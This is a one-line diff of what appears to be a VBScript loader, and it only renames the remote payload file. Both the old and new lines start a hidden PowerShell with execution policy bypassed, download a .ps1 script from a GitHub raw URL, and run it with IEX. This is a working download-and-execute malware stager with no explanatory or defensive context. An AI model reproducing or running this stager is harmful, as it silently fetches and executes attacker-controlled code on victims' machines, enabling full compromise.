@@ -1,1 +1,1 @@
-CreateObject("WScript.Shell").Run "cmd /c start /B powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass ""IEX((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/cia168168/folder/main/RunD.ps1'))""", 0, True
+CreateObject("WScript.Shell").Run "cmd /c start /B powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass ""IEX((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/cia168168/folder/main/RUNX.ps1'))""", 0, True
